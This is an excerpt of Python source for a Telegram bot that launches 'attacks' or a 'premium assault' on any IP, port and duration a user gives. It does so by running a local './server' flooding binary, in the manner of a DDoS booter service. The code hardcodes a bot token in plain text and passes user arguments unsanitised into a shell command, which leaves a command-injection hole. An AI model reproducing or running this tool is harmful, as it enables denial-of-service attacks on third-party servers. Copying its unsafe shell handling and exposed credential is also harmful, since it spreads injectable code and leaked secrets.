...
TELEGRAM_BOT_TOKEN = '6116505416:AAGwXyotVFJt3dviglxlF5b7WTdHFHYlDWs'
ADMIN_USER_ID = 5277158553
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "👉 Use `/server <ip> <port> <duration>` to initiate your premium assault.\n"
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./server {ip} {port} {duration} 1100",
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/ <ip> <port> <duration>`", parse_mode='Markdown')
        return
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id == ADMIN_USER_ID:
        help_message = (
            "🛠 **Admin Commands:**\n"
            "/start - Start the bot\n"
            "/server <ip> <port> <duration> - Launch an attack\n"
